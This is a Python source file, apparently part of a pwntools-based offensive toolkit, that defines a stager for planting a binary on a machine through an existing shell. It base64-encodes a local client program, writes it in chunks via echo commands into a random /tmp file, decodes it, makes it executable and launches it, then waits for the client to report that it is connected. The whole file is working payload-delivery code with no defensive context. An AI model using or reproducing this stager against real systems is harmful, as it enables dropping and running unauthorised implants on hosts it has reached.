from pwnlib.tubes.tube import tube
from pwnlib.log import getLogger

from secrets import token_hex
import base64

from knecht.transmit.chunked import Chunked

import os

log = getLogger(__name__)

CLIENT_PATH = os.path.join(os.path.dirname(__file__), 'client/bin/client')
CHUNK_SIZE = 76

class Stager:
    def __init__(self, client: tube, client_filepath:str='/tmp/client'):
        self.client = client
        self.tempfile = f'/tmp/b64_{token_hex(6)}'
        self.client_filepath = client_filepath

        client.sendline(f'''rm {self.tempfile}; echo done'''.encode())
        if not self.client.recvuntil(b'done'):
            log.error('failed to remove tempfile')

    def send_chunk(self, chunk:bytes):
        akn = token_hex(6)
        self.client.sendline(f'''echo '{chunk.decode()}' >> {self.tempfile} && echo 'done-''{akn}' '''.encode())     # weird akn format to prevent shells which echo input to seem as a akn
        if not self.client.recvuntil(f'done-{akn}'.encode()):
            log.error('transmition failed')

    def upload(self):
        with open(CLIENT_PATH, 'rb') as f:
            encoded_content = base64.b64encode(f.read())

        for i, chunk in Chunked(encoded_content, CHUNK_SIZE):
            self.send_chunk(chunk)

        self.client.sendline(f'''cat {self.tempfile} | base64 -d > {self.client_filepath} && chmod +x {self.client_filepath}'''.encode())

    def launch(self) -> tube:
        self.client.sendline(f'''{self.client_filepath}'''.encode())
        if not self.client.recvuntil(b'connected\n'):
            log.error('failed to launch client')
        return self.client


if __name__ == "__main__":
    from pwn import process

    client = process(['/bin/sh'])
    stager = Stager(client)
    stager.upload()
    client.sendline(stager.client_filepath.encode())
    client.interactive()